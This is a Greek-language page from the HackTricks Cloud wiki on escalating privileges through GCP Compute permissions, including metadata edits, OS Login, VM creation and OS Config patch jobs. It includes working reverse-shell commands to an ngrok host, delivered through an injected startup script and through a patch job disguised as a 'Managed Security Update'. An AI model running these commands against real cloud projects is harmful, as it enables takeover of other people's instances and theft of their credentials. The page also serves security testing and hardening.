# GCP - Compute Privesc

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compute

Για περισσότερες πληροφορίες σχετικά με το Compute και το VPC (δίκτυο) στο GCP ελέγξτε:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Σημειώστε ότι για να εκτελέσετε όλες τις επιθέσεις ανύψωσης προνομίων που απαιτούν να τροποποιήσετε τα μεταδεδομένα της παρουσίας (όπως η προσθήκη νέων χρηστών και SSH κλειδιών) είναι **αναγκαίο να έχετε δικαιώματα `actAs` πάνω στο SA που είναι συνδεδεμένο με την παρουσία**, ακόμη και αν το SA είναι ήδη συνδεδεμένο!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Με αυτή την άδεια μπορείτε να **τροποποιήσετε** τις πληροφορίες **μεταδεδομένων** μιας **παρουσίας** και να αλλάξετε τα **εξουσιοδοτημένα κλειδιά ενός χρήστη**, ή να **δημιουργήσετε** έναν **νέο χρήστη με δικαιώματα sudo**. Επομένως, θα μπορείτε να εκτελέσετε μέσω SSH σε οποιαδήποτε VM παρουσία και να κλέψετε τον GCP Service Account με τον οποίο τρέχει η παρουσία.\
Περιορισμοί:

* Σημειώστε ότι οι GCP Service Accounts που τρέχουν σε VM παρουσίες από προεπιλογή έχουν **πολύ περιορισμένο πεδίο**
* Θα χρειαστεί να είστε **σε θέση να επικοινωνήσετε με τον SSH** διακομιστή για να συνδεθείτε

Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτή την άδεια ελέγξτε:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Μπορείτε επίσης να εκτελέσετε αυτή την επίθεση προσθέτοντας νέο startup-script και επανεκκινώντας την παρουσία:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Αυτή η άδεια δίνει τα **ίδια προνόμια με την προηγούμενη άδεια** αλλά σε συγκεκριμένες περιπτώσεις αντί για ολόκληρο το έργο. **Οι ίδιες εκμεταλλεύσεις και περιορισμοί όπως για την προηγούμενη ενότητα ισχύουν**.

### `compute.instances.setIamPolicy`

Αυτού του είδους η άδεια θα σας επιτρέψει να **παραχωρήσετε στον εαυτό σας έναν ρόλο με τις προηγούμενες άδειες** και να κλιμακώσετε τα προνόμια εκμεταλλευόμενοι αυτές.

### **`compute.instances.osLogin`**

Εάν **το OSLogin είναι ενεργοποιημένο στην περίπτωση**, με αυτή την άδεια μπορείτε απλά να εκτελέσετε **`gcloud compute ssh [INSTANCE]`** και να συνδεθείτε στην περίπτωση. Δεν **θα έχετε δικαιώματα root** μέσα στην περίπτωση.

{% hint style="success" %}
Για να συνδεθείτε επιτυχώς με αυτή την άδεια μέσα στην VM περίπτωση, πρέπει να έχετε την άδεια `iam.serviceAccounts.actAs` πάνω στο SA που είναι συνδεδεμένο στην VM.
{% endhint %}

### **`compute.instances.osAdminLogin`**

Εάν **το OSLogin είναι ενεργοποιημένο στην περίπτωση**, με αυτή την άδεια μπορείτε απλά να εκτελέσετε **`gcloud compute ssh [INSTANCE]`** και να συνδεθείτε στην περίπτωση. Θα έχετε **δικαιώματα root** μέσα στην περίπτωση.

{% hint style="success" %}
Για να συνδεθείτε επιτυχώς με αυτή την άδεια μέσα στην VM περίπτωση, πρέπει να έχετε την άδεια `iam.serviceAccounts.actAs` πάνω στο SA που είναι συνδεδεμένο στην VM.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Είναι δυνατόν να **δημιουργήσετε μια εικονική μηχανή με ανατεθειμένο Service Account και να κλέψετε το token** του service account αποκτώντας πρόσβαση στα μεταδεδομένα για να κλιμακώσετε τα προνόμια σε αυτό.

Το σενάριο εκμετάλλευσης για αυτή τη μέθοδο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

Εάν έχετε τις άδειες **`osconfig.patchDeployments.create`** ή **`osconfig.patchJobs.exec`** μπορείτε να δημιουργήσετε μια [**εργασία patch ή ανάπτυξη**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching). Αυτό θα σας επιτρέψει να κινηθείτε οριζόντια στο περιβάλλον και να αποκτήσετε εκτέλεση κώδικα σε όλες τις υπολογιστικές περιπτώσεις εντός ενός έργου.

Σημειώστε ότι αυτή τη στιγμή **δεν χρειάζεστε άδεια `actAs`** πάνω στο SA που είναι συνδεδεμένο στην περίπτωση.

Εάν θέλετε να εκμεταλλευτείτε αυτό χειροκίνητα, θα χρειαστεί να δημιουργήσετε είτε μια [**εργασία patch**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_job.json) **ή** [**ανάπτυξη**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_deployment.json)**.**\
Για μια εργασία patch εκτελέστε:

{% code overflow="wrap" %}
```python
cat > /tmp/patch-job.sh <<EOF
#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18442 0>&1
EOF

gsutil cp /tmp/patch-job.sh gs://readable-bucket-by-sa-in-instance/patch-job.sh

# Get the generation number
gsutil ls -a gs://readable-bucket-by-sa-in-instance

gcloud --project=$PROJECT_ID compute os-config patch-jobs execute \
--instance-filter-names=zones/us-central1-a/instances/<instance-name> \
--pre-patch-linux-executable=gs://readable-bucket-by-sa-in-instance/patch-job.sh#<generation-number> \
--reboot-config=never \
--display-name="Managed Security Update" \
--duration=300s
```
{% endcode %}

Για να αναπτύξετε μια ανάπτυξη διορθώσεων:
```bash
gcloud compute os-config patch-deployments create <name> ...
```
Το εργαλείο [patchy](https://github.com/rek7/patchy) θα μπορούσε να έχει χρησιμοποιηθεί στο παρελθόν για την εκμετάλλευση αυτής της κακής ρύθμισης (αλλά τώρα δεν λειτουργεί).

**Ένας επιτιθέμενος θα μπορούσε επίσης να το εκμεταλλευτεί για επιμονή.**

### `compute.machineImages.setIamPolicy`

**Δώστε στον εαυτό σας επιπλέον δικαιώματα** για την εικόνα υπολογιστή.

### `compute.snapshots.setIamPolicy`

**Δώστε στον εαυτό σας επιπλέον δικαιώματα** για ένα στιγμιότυπο δίσκου.

### `compute.disks.setIamPolicy`

**Δώστε στον εαυτό σας επιπλέον δικαιώματα** για έναν δίσκο.

### Παράκαμψη Πεδίων Πρόσβασης

Ακολουθώντας αυτόν τον σύνδεσμο θα βρείτε μερικές [**ιδέες για να προσπαθήσετε να παρακάμψετε τα πεδία πρόσβασης**](../).

### Τοπική Κλιμάκωση Δικαιωμάτων σε GCP Compute instance

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Αναφορές

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
